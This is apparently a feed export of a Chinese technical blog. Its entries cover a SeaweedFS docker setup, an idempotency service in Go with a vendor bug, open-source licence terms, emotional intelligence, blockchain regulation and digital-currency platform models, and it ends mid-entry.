    <content><![CDATA[<p>SeaweedFS 是开源的，简单的，高伸缩性的分布式文件系统。SeaweedFS 作为支持全 POSIX 文件系统语义替代，Seaweed-FS 选择仅实现 key-file 的映射，类似 “NoSQL”，也可以说是 “NoFS”。</p>
<p>SeaweedFS 仅花费 40 字节的硬盘来存储每个文件的元数据。</p>
<h4 id="与GlusterFS-Ceph相比较"><a href="#与GlusterFS-Ceph相比较" class="headerlink" title="与GlusterFS, Ceph相比较"></a>与<a href="https://www.gluster.org/">GlusterFS</a>, <a href="https://ceph.io/">Ceph</a>相比较</h4><table>
<thead>
<tr>
<th>System</th>
<th>File Meta</th>
<th>File Content Read</th>
<th>POSIX</th>
<th>REST API</th>
<th>Optimized for small files</th>
</tr>
</thead>
<tbody><tr>
<td>SeaweedFS</td>
<td>lookup volume id, cacheable</td>
<td>O(1) disk seek</td>
<td></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>SeaweedFS Filer</td>
<td>Linearly Scalable, Customizable</td>
<td>O(1) disk seek</td>
<td>FUSE</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>GlusterFS</td>
<td>hashing</td>
<td></td>
<td>FUSE, NFS</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Ceph</td>
<td>hashing + rules</td>
<td></td>
<td>FUSE</td>
<td>Yes</td>
<td></td>
</tr>
<tr>
<td>MooseFS</td>
<td>in memory</td>
<td></td>
<td>FUSE</td>
<td></td>
<td>No</td>
</tr>
</tbody></table>
<h4 id="体验seaweedfs"><a href="#体验seaweedfs" class="headerlink" title="体验seaweedfs"></a>体验seaweedfs</h4><p>参考==&gt;<a href="https://hub.docker.com/r/chrislusf/seaweedfs">https://hub.docker.com/r/chrislusf/seaweedfs</a></p>
<ol>
<li>拉取 docker-compose 文件，<code>wget https://raw.githubusercontent.com/chrislusf/seaweedfs/master/docker/seaweedfs-compose.yml</code></li>
<li>启动，<code>docker-compose -f seaweedfs-compose.yml -p seaweedfs up</code></li>
</ol>
<p>参考 =&gt; <a href="https://github.com/chrislusf/seaweedfs/wiki/Volume-Server-API">https://github.com/chrislusf/seaweedfs/wiki/Volume-Server-API</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  seaweedfs: curl http://localhost:9333/dir/assign</span><br><span class="line">&#123;&quot;fid&quot;:&quot;7,01248b7b86&quot;,&quot;url&quot;:&quot;172.18.0.3:8080&quot;,&quot;publicUrl&quot;:&quot;172.18.0.3:8080&quot;,&quot;count&quot;:1&#125;%                                                                         </span><br><span class="line">➜  seaweedfs: curl -F file=@/home/will/documents/zaq12wsxcde3--de4064dc15870163a9aab589a1ccf7900dd68ef4 http://127.0.0.1:8080/7,01248b7b86</span><br><span class="line">&#123;&quot;name&quot;:&quot;zaq12wsxcde3--de4064dc15870163a9aab589a1ccf7900dd68ef4&quot;,&quot;size&quot;:489,&quot;eTag&quot;:&quot;468de108&quot;&#125;%                                                                 </span><br><span class="line">➜  seaweedfs: curl http://localhost:9333/dir/lookup\?volumeId\=7</span><br><span class="line">&#123;&quot;volumeId&quot;:&quot;7&quot;,&quot;locations&quot;:[&#123;&quot;url&quot;:&quot;172.18.0.3:8080&quot;,&quot;publicUrl&quot;:&quot;172.18.0.3:8080&quot;&#125;]&#125;% </span><br></pre></td></tr></table></figure>

<ol start="3">
<li><code>curl http://localhost:9333/dir/assign</code> 获取fid</li>
<li><code>curl -F file=@/home/will/documents/zaq12wsxcde3--de4064dc15870163a9aab589a1ccf7900dd68ef4 http://127.0.0.1:8080/7,01248b7b86</code> 上传文件</li>
<li><code>curl http://localhost:9333/dir/lookup\?volumeId\=7</code> 查询</li>
<li>在浏览器中打开 <code>http://172.18.0.3:8080/7,01248b7b86</code>，查看文档</li>
<li>master 的url：<code>http://127.0.0.1:9333/</code></li>
<li>volume的url：<code>http://172.18.0.3:8080/ui/index.html</code></li>
</ol>
<p><img src="/2020/04/16/%E5%B0%8F%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9Fseaweedfs/1.png"></p>
<p><img src="/2020/04/16/%E5%B0%8F%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9Fseaweedfs/2.png"></p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>幂等性服务</title>
    <url>/2023/09/18/%E5%B9%82%E7%AD%89%E6%80%A7%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>由于供应商系统的幂等性服务有bug，经过一番争执，终于说服了对方。现将经由记录如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─────────┐      ┌────────────┐     ┌────────────┐</span><br><span class="line">│  客户端  │  ┌──►│  幂等性服务 │  ┌──►│  数据存储   │</span><br><span class="line">└─────────┘  │   └────────────┘  │  └────────────┘</span><br><span class="line">             │                   │</span><br><span class="line">             │                   │</span><br><span class="line">             │   ┌───────────┐   │</span><br><span class="line">             ├──►│ 请求处理   │───┤</span><br><span class="line">             │   └───────────┘   │</span><br><span class="line">             │                   │</span><br><span class="line">             │                   │</span><br><span class="line">             │   ┌───────────┐   │</span><br><span class="line">             ├──►│  检查状态  │───┤</span><br><span class="line">             │   └───────────┘   │</span><br><span class="line">             │                   │</span><br><span class="line">             │                   │</span><br><span class="line">             │   ┌───────────┐   │</span><br><span class="line">             ├──►│ 执行操作   │───┤</span><br><span class="line">             │   └───────────┘   │</span><br><span class="line">             │                   │</span><br><span class="line">             │                   │</span><br><span class="line">             │   ┌───────────┐   │</span><br><span class="line">             ├──►│ 更新状态   │───┤</span><br><span class="line">             │   └───────────┘   │</span><br><span class="line">             │                   │</span><br><span class="line">             └───────────────────┘</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>客户端：</strong> 这是发起请求的外部实体，可能是用户、其他服务或应用程序。</li>
<li><strong>幂等性服务：</strong> 这是幂等性服务的核心组件，负责接收和处理来自客户端的请求。</li>
<li><strong>数据存储：</strong> 数据存储组件用于存储已处理请求的唯一标识符，以及可能需要的其他相关数据。这可以是数据库、缓存或文件系统等。</li>
<li><strong>请求处理：</strong> 请求处理模块负责解析和验证请求，包括提取唯一标识符和其他请求参数。</li>
<li><strong>检查状态：</strong> 在处理请求之前，服务会检查请求的状态，以确保请求之前未被处理过。这一步骤通常涉及检查唯一标识符是否在数据存储中存在。</li>
<li><strong>执行操作：</strong> 执行操作模块负责实际执行请求所需的操作。这可能包括创建订单、更新资源、执行业务逻辑等。</li>
<li><strong>更新状态：</strong> 更新状态模块负责在请求处理成功后，将请求的唯一标识符添加到数据存储中，以标记该请求已被处理。</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据存储：使用映射来存储已处理请求的唯一标识符</span></span><br><span class="line"><span class="keyword">var</span> processedRequests = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">var</span> mutex = &amp;sync.Mutex&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理HTTP请求的处理程序函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleRequest</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 从请求中获取唯一标识符</span></span><br><span class="line">    requestID := r.Header.Get(<span class="string">&quot;Request-ID&quot;</span>)</span><br><span class="line">    <span class="comment">// 使用互斥锁保护共享数据</span></span><br><span class="line">    mutex.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mutex.Unlock()</span><br><span class="line">    <span class="comment">// 检查请求是否已经处理过</span></span><br><span class="line">    <span class="keyword">if</span> processedRequests[requestID] &#123;</span><br><span class="line">        <span class="comment">// 如果已处理过，返回已处理的响应</span></span><br><span class="line">        w.WriteHeader(http.StatusOK)</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;Request already processed\n&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果未处理过，执行请求操作</span></span><br><span class="line">        <span class="comment">// 注意：在实际应用中，要确保请求操作是幂等的</span></span><br><span class="line">        result := performRequestOperation(r)</span><br><span class="line">        <span class="comment">// 更新已处理请求的映射</span></span><br><span class="line">        processedRequests[requestID] = <span class="literal">true</span></span><br><span class="line">        <span class="comment">// 返回操作结果</span></span><br><span class="line">        <span class="keyword">if</span> result &#123;</span><br><span class="line">            w.WriteHeader(http.StatusOK)</span><br><span class="line">            fmt.Fprintf(w, <span class="string">&quot;Request processed successfully\n&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            w.WriteHeader(http.StatusInternalServerError)</span><br><span class="line">            fmt.Fprintf(w, <span class="string">&quot;Request processing failed\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行请求操作的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">performRequestOperation</span><span class="params">(r *http.Request)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// 在这里执行实际的请求操作，确保操作是幂等的</span></span><br><span class="line">    <span class="comment">// 例如，创建订单、更新资源、执行业务逻辑等</span></span><br><span class="line">    <span class="comment">// 如果操作成功，返回true；否则返回false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建HTTP服务器</span></span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/process&quot;</span>, handleRequest)</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Bug针对上述代码中的 <code>result</code> ，如果是 false 的情况下，该 Token 的请求处理结果应该记录为 <code>false</code>， 即 <code>processedRequests[requestID] = false</code>。<br>本例子中，供应商的错误在哪里呢？供应商系统的幂等服务，在24小时内，如果出现错误，服务不会重新执行，而是认为已经处理完成，继续抛出同样的 error message。实在不能够接受。</p>
]]></content>
      <tags>
        <tag>架构模式</tag>
      </tags>
  </entry>
  <entry>
    <title>开源协议的详细要求</title>
    <url>/2018/06/05/%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E8%A6%81%E6%B1%82/</url>
    <content><![CDATA[<h4 id="BSD开源协议"><a href="#BSD开源协议" class="headerlink" title="BSD开源协议"></a>BSD开源协议</h4><p>是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。当你发布使用了BSD协议的代码，或者以BSD协议代码为基础做二次开发自己的产品时，需要满足三个条件：</p>
<ul>
<li>如果再发布的产品中包含源代码，则在源代码中必须带有原来代码中的BSD协议。</li>
<li>如果再发布的只是二进制类库/软件，则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议。</li>
<li>不可以用开源代码的作者/机构名字和原来产品的名字做市场推广。</li>
</ul>
<p>BSD代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。很多的公司企业在选用开源产品的时候都首选BSD协议，因为可以完全控制这些第三方的代码，在必要的时候可以修改或者 二次开发。</p>
<h4 id="Apache-Licene-2-0-协议"><a href="#Apache-Licene-2-0-协议" class="headerlink" title="Apache Licene 2.0 协议"></a>Apache Licene 2.0 协议</h4><p>Apache Licence是著名的非盈利开源组织Apache采用的协议。该协议和BSD类似，同样鼓励代码共享和尊重原作者的著作权，同样允许代码修改，再发布（作为开源或商业软件）。需要满足的条件也和BSD类似：</p>
<ul>
<li>需要给代码的用户一份Apache Licence</li>
<li>如果你修改了代码，需要在被修改的文件中说明。</li>
<li>在延伸的代码中（修改和有源代码衍生的代码中）需要带有原来代码中的协议，商标，专利声明和其他原来作者规定需要包含的说明。</li>
<li>如果再发布的产品中包含一个Notice文件，则在Notice文件中需要带有Apache Licence。你可以在Notice中增加自己的许可，但不可以表现为对Apache Licence构成更改。</li>
<li>Apache Licence也是对商业应用友好的许可。使用者也可以在需要的时候修改代码来满足需要并作为开源或商业产品发布/销售。</li>
</ul>
<p>英文原文：<a href="http://www.apache.org/licenses/LICENSE-2.0.html">http://www.apache.org/licenses/LICENSE-2.0.html</a></p>
<h4 id="MIT-协议"><a href="#MIT-协议" class="headerlink" title="MIT 协议"></a>MIT 协议</h4><p>MIT许可证之名源自麻省理工学院（Massachusetts Institute of Technology, MIT），又称「X条款」（X License）或「X11条款」（X11 License）</p>
<p>MIT内容与三条款BSD许可证（3-clause BSD license）内容颇为近似，但是赋予软体被授权人更大的权利与更少的限制。</p>
<p>被授权人有权利使用、复制、修改、合并、出版发行、散布、再授权及贩售软体及软体的副本。</p>
<p>被授权人可根据程式的需要修改授权条款为适当的内容。</p>
<p>在软件和软件的所有副本中都必须包含版权声明和许可声明。</p>
<p>此授权条款并非属copyleft的自由软体授权条款，允许在自由/开放源码软体或非自由软体（proprietary software）所使用。</p>
<p>此亦为MIT与BSD（The BSD license, 3-clause BSD license）本质上不同处。</p>
<p>MIT条款可与其他授权条款并存。另外，MIT条款也是自由软体基金会（FSF）所认可的自由软体授权条款，与GPL相容。</p>
<p>协议英文原文：<a href="http://www.opensource.org/licenses/mit-license.php">http://www.opensource.org/licenses/mit-license.php</a></p>
<h4 id="GPL-协议"><a href="#GPL-协议" class="headerlink" title="GPL 协议"></a>GPL 协议</h4><p>在自由软件所使用的各种许可证之中，最为人们注意的也许是通用性公开许可证(General Public License，简称GPL)。</p>
<p>GPL同其它的自由软件许可证一样，许可社会公众享有：运行、复制软件的自由，发行传播软件的自由，获得软件源码的自由，改进软件并将自己作出的改进版本向社会发行传播的自由。<br>GPL还规定：只要这种修改文本在整体上或者其某个部分来源于遵循GPL的程序，该修改文本的 整体就必须按照GPL流通，不仅该修改文本的源码必须向社会公开，而且对于这种修改文本的流通不准许附加修改者自己作出的限制。因此，一项遵循GPL流通 的程序不能同非自由的软件合并。GPL所表达的这种流通规则称为copyleft，表示与copyright(版权)的概念“相左”。</p>
<p>GPL协议最主要的几个原则：</p>
<ul>
<li><p>确保软件自始至终都以开放源代码形式发布，保护开发成果不被窃取用作商业发售。任何一套软 件，只要其中使用了受 GPL 协议保护的第三方软件的源程序，并向非开发人员发布时，软件本身也就自动成为受 GPL 保护并且约束的实体。也就是说，此时它必须开放源代码。</p>
</li>
<li><p>GPL 大致就是一个左侧版权（Copyleft，或译为“反版权”、“版权属左”、“版权所无”、“版责”等）的体现。你可以去掉所有原作的版权 信息，只要你保持开源，并且随源代码、二进制版附上 GPL 的许可证就行，让后人可以很明确地得知此软件的授权信息。GPL 精髓就是，只要使软件在完整开源 的情况下，尽可能使使用者得到自由发挥的空间，使软件得到更快更好的发展。</p>
</li>
<li><p>无论软件以何种形式发布，都必须同时附上源代码。例如在 Web 上提供下载，就必须在二进制版本（如果有的话）下载的同一个页面，清楚地提供源代码下载的链接。如果以光盘形式发布，就必须同时附上源文件的光盘。</p>
</li>
<li><p>开发或维护遵循 GPL 协议开发的软件的公司或个人，可以对使用者收取一定的服务费用。但还是一句老话——必须无偿提供软件的完整源代码，不得将源代码与服务做捆绑或任何变相捆绑销售。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>开源协议</tag>
      </tags>
  </entry>
  <entry>
    <title>情商及相关能力</title>
    <url>/2020/02/23/%E6%83%85%E5%95%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%83%BD%E5%8A%9B/</url>
    <content><![CDATA[<p>情商是一种个人能力：这些能力决定我们如何进行自我管理</p>
<ol>
<li>自我意识<ul>
<li>情感的自我意识：了解个人情感及其影响；用直觉引导决策。</li>
<li>准确的自我评估：了解个人的优缺点。</li>
<li>自信：准确感知个人的价值和能力。</li>
</ul>
</li>
<li>自我管理<ul>
<li>情感的自我控制：控制消极情感和冲动。</li>
<li>透明度：表现出诚实、正直以及可信度。</li>
<li>适应能力：灵活应对不断变化的情况，客服阻碍。</li>
<li>成就感：提升表现以满足卓越性的内在标准的驱动力。</li>
<li>主动性：时刻准备采取行动，抓住机遇。</li>
<li>积极乐观：看到事情积极的一面。</li>
<li>社会能力：这些能力决定我们如何处理人际关系。</li>
</ul>
</li>
<li>社会意识<ul>
<li>同理心：感受他人的情感，了解他人的观点，主动了解他人的关注点。</li>
<li>组织意识：了解组织的现状、决策网以及组织政治。</li>
<li>服务：了解并满足员工、客户或顾客的需求。</li>
</ul>
</li>
<li>关系管理<ul>
<li>鼓舞人心的领导：用一个令人信服的愿景指导并鼓舞员工。</li>
<li>影响：运用各种策略增强说服力。</li>
<li>开发他人能力：通过反馈和指导增强他人的能力。</li>
<li>改变刺激因素：设定新的方向，启发、管理并领导员工。</li>
<li>冲突管理：解决分歧。</li>
<li>团队合作和协作：合作与团队建设。</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>leadership</tag>
      </tags>
  </entry>
  <entry>
    <title>打造数字经济新基建解放数据生产力</title>
    <url>/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/</url>
    <content><![CDATA[<p>参考链接==&gt; <a href="https://finance.ifeng.com/c/80uObrTpZ8m">https://finance.ifeng.com/c/80uObrTpZ8m</a></p>
<p>10月27日，在万向区块链主办的第六届区块链全球峰会上，微众银行副行长兼首席信息官马智涛分享了《打造数字经济“新基建” 解放数据生产力》主题演讲。马智涛认为，如何对解放数据生产力仍处在探索阶段，面临四大难题：首先，数据的产权难以界定；其次，数据易成为数据孤岛，不易评估和发挥价值；数据易泄露、易盗用、易滥用、难追踪；存储与处理海量、多维数据的难度较大。基于人工智能、区块链、云计算、大数据的四大科技能力，数字”新基建”能够有效攻克数据要素中安全存储、可信传输以及协同生产的三大问题，让数据产权可界定，数据价值可存储、评估与有效流通，最终实现数据生产力的全面解放。</p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/1.JPG"></p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/2.JPG"></p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/3.JPG"></p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/4.JPG"></p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/5.JPG"></p>
<p><img src="/2020/10/29/%E6%89%93%E9%80%A0%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%96%B0%E5%9F%BA%E5%BB%BA%E8%A7%A3%E6%94%BE%E6%95%B0%E6%8D%AE%E7%94%9F%E4%BA%A7%E5%8A%9B/6.JPG"></p>
]]></content>
  </entry>
  <entry>
    <title>区块链监管思考</title>
    <url>/2022/08/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9B%91%E7%AE%A1%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>嵌入式监管？集中式监管？</p>
<p>解决该问题的核心是需要在协议层进行监管。监管单位在每条链都有节点，可以得到全部交易信息，不需要经过收集、集中、分类、发送到监管单位，而是直接在数据端拿到数据后，可以使用blockchain data lake区块链数据湖来进行大数据分析。</p>
<p>如上文所讲，Libra 2.0总体监管机制仍落后。关于自动合规并没有任何细节。</p>
<p>在实践上，ISDA（International swap and derivatives association 国际交换交易商协会）提出的交易和监管框架，其创新之处是将事件处理放进交易系统。这套ISDA监管体系完整、自动化且标准化，《智能合约：重构社会契约》一书对此有详细介绍，ISDA的监管体系比Liba2.0体系要完整得多。</p>
<p>Liba2.0的监管计划比熊猫模型、ISDA和英国央行的监管计划都要轻量级得多：在熊猫模型中，监管单位直接在账户链(ABC)和交易链(TBC)上进行监管；在SDA模型中，有完整、自动化、标准化的体系；在英国央行合约模型中，监管代码是由监管单位开发和运行。Libra2.0除协议层监管外，其他的监管方式都通过传统机制进行。也就是说协会使用已有的监管系统和机制，而这些机制和数字货币没有<br>关系，只是和金融活动有关系，例如股票交易、资金流转、期货买卖等。这表示目前美国在监管科技还是没有和新型交易科技同步，即美国到今天还没有对应的监管科技系统存在，这会使美国监管Libra2.0出现压力。</p>
<p>总体监管机制落后的一个主要原因，是对新型监管机制的需求还不明确。直到Libra1.0出现，该需求才变得急迫。Libra 1.0出现之前，基于区块链的监管系统还没有被建立出来。在国际上，多半的监管论文还是集中在大数据和人工智能上面（很少区块链监管论文），并且相关监管科技的实验也非常少，甚至在一些监管科技产业报告中，区块链都没有被列入重要科技名单中。但是Libr1.0出现后，这些机构纷纷改变态度，例如联合国在2019年立刻将区块链列为最重要的金融科技之一。而我们在2018年已经将区块链监管科技列为区块链中国梦之四《区块链的中国梦：RegTech编织全面安全梦》，并且提出“监管性”是新型区块链必要的功能，在新型数字货币市场，交易会是实时的，监管也需要是实时的。实时交易，实时监管，而只有嵌入式监管可以实现实时监管。</p>
<p>由于大部分的监管机制使用传统方式，Libra 2.0等区块链的出现，会给监管单位带来了巨大的压力。</p>
<p>目前几类监管的特性与现状—《互链网》page-405</p>
<p><img src="/2022/08/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9B%91%E7%AE%A1%E6%80%9D%E8%80%83/1.png"></p>
]]></content>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>数字货币平台分析</title>
    <url>/2022/08/08/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%B9%B3%E5%8F%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>数字货币平台具有不对称的优势</strong>（比目鱼模型，比目鱼具有扁平的身体，眼睛只生长在身体的一侧，具有鱼类中独一无二的不对称结构）<br>数字法币成为全球通用货币后，监管面临了新的考验。一般来说，数字法币由国家发行，由国家信用保障兑付。即使使用国际货币基金组织提出的央行－民间合作方式，数字货币仍然是一国央行和在该国注册的公司合作的金融产品，其他国家不可能拥有监管权。英国开创数字英镑的重要原因，就是要拿回监管权。如果完成数字英镑，该货币如果成为世界通用货币，其他国家会担心自己的货币金融体系受到了威胁。</p>
<p>因此，对这种非对称监管关系，可能会有以下几种情形出现：</p>
<p>（1）<strong>主权独享式</strong>：单个国家完全享有监管权，原因是这是由单个国家发行的数字法币，该国央行支持，由该国货币储备保障运行。其他国家、商家或是个人使用，都必须遵守该国法律。但作为全球货币，这种制度渗透和金融霸权模式必定受到其他国家的拒绝，Libra受到德法两国的坚决抵制就是典型的例子。同时，以德国为首的各国都开始在区块链和数字货币领域建立自己的战略部署，建立各国自有的数字法币系统，并不特别说明数字法币是潜在的全球货币，鼓励各国的商家和个人注册和交易，等到米已成粥，才将制度、监管和法律问题一并抛出。该机制以国家主权为第一优先，称为主权式。</p>
<p>（2）<strong>完全共享式</strong>：发行国和参与国完全共享监管权，这是另外一个极端。数字法币发行国和参与国家共享数据。但这种体系本身也有很多不平衡性，在发行基础设施方面的投入和使用量最大的都是发行国，如果所有交易让所有参与国都可以看见，安全机制和经济利益上都无法说服发行国接受，其他的参与国也可能产生异议，我们称之为完全共享式监管。</p>
<p>（3）<strong>部分共享式</strong>：发行国可以看到全部交易信息，而参与国只能看到和该国相关的交易信息。这样参与国可能可以接受，而发行国也可以接受。但是这样的监管机制会导致系统十分复杂。例如，该系统有100个国家参与，每个国家的监管机制一定会有各种各样的差异性，对应需要建立100套监管机制，核心运行的是一个系统，但是对应100套监管机制，系统将无法负荷这样的复杂性。要解决这个问题，需要参与国建立联盟式监管机制，建立一个“大监管机制”来包容许多国家的监管法规。但是这种“大监管机制”是否能够顺利完成，在什么条件下可以实现，这些都是数字法币发展中必须考虑的问题。这种机制事实上在美国医药区块链上已经使用，但是这样的机制不涉及主权，只涉及被监管的药。另外，如何确定交易属于哪个国家监管还是一个尚需研究的问题，监管的对象是物理地址还是网络地址仍然有待商榷。在现有网络架构下，如何解决多物理地址和多网络地址问题，并且确保在现有机制下如何保证参与国能够收到应该收到的信息，同时看不见其他国家的交易信息。但是在这种机制下，参与国有理由怀疑发行国作弊，故意不发一些重要信息。因为这一机制下的参与国都只能获得部分信息，所以我们称之为部分共享式。</p>
<p>（4）<strong>分层分片式</strong>：发行国和参与国都只能看到和该国相关的交易信息。这个机制的公平性大大提高，但新的问题出现了，谁是最合适的信息传输主导者？可能又回到现在SWIFT的环境，由一个中心来主导信息。发行国必定要成为自己数字法币的主导者，不太可能主动出让和分享主导权。但是如果发行国非常想要大力推行自己国家的数字法币，可能会同意该机制。因为这个机制可能会给一个国家的数字法币带来极大的边际效应，大到在其他方面做出大量让步都值得。而机制的设计对信息进行了权属分层和数据切片，使得每个国家只能看到自己的相关信息，通过权属申请可分享的信息，各国在数据分享中各行其志，规避了完全共享中涉及其他国家数据分享的问题，我们称之为分层分片式监管。这个是最靠近对称性的监管机制，但这个还不是对称性。发行方还是有更多的权力，因为系统操纵在发行方。</p>
<p>​    在部分共享式和分层分片式中，都需要有一套机制来调节和决策信息的分享能力和权属程度。因为交易是高速的，也是实时结算的，相应的监管机制必须是实时的、自动化的。在西方国家，通常会成立一个委员会，由委员会来制定规则，然后交给软件系统自动处理。在区块链领域“代码就是法律”（Code is law），软件自动执行智能合约内容，因此制度的制定至关重要，委员会的会员拥有很大的权力。在数字法币委员会上，发行国在委员会占据大部分的席位，就像Libra中的初始发起会员一样。因此，发行方在整个机制运行控制上还是拥有非常大的权力。</p>
<p>​    类似的问题也会出现在脸书Libra币的监管中，目前世界各国都在讨论Libra是否能纳入本国监管制度的合规体系。相比之下，一个更重要的问题是各国如何“共同”监管Libra币的运行。区块链中心思想是共识机制，但是主权监管本身是中心化决策，共识型的监管如何在各国金融体系中落地实现，将会是一个难题。</p>
<ul>
<li>平台理论：数字货币需要平台才能运行，因此数字货币的竞争，也会是平台的竞争。例如电商的竞争（如阿里和京东），也是电商各自平台的竞争；传统数字代币（如比特币和以太坊）离开其平台无法运行，因此数字代币竞争也是平台竞争；若将来央行发行数字法币，也会运行在其平台上，因此如果平台有问题，那么竞争就会失去优势。比如早期一些数字法币平台计划部署在公链上，但是因为公链平台不适合数字法币的运行，因此这些计划很快就没有市场。国际货币基金组织（IMF）、英国央行、普林斯顿大学、美联储都表示数字法币会依托于平台，因此平台优越是竞争的最大优势。平台属性（例如速度、隐私、监管）将决定数字法币的功能、<br>性能、安全、市场。</li>
<li>比目鱼模型：数字货币平台方具有不对称的优势（如上文），比平台参与方拥有更多信息，即使使用看似最公平的治理制度，平台方仍然拥有优势。该模型包括主权独享式（平台国家独享监管权）、完成共享式（所有参与国家都有同样的监管权）、部分共享式（参与国可以监管和自己相关的交易信息，但平台方享有全部数据）、分层共享式（所有参与国只可以看到和监管与自己相关的交易信息，但平台方享有全部数据）。即使是公平的方式（完成共享式和分层共享式），平台方还是拥有优势，因为平台方控制后台数据，而且可以使用这数据进行分析。</li>
<li>交易理论：数字货币以交易为最主要的考量，这改变了货币三大用图的平衡：交易媒介、价值储存、计量单位，通过数字货币交易，世界储备货币可以从美元换成合成霸权数字货币。该理论由普林斯顿大学提出，英国央行、欧洲央行、美联储都公开讨论并引用。</li>
</ul>
]]></content>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>数字货币入门</title>
    <url>/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>2020年1月21日，国际清算银行（BIS）、加拿大央行、英国央行、日本央行、欧央行、瑞典央行和瑞士央行官网同时发布一则信息：成立央行小组，开展CBDC应用案例研发。</p>
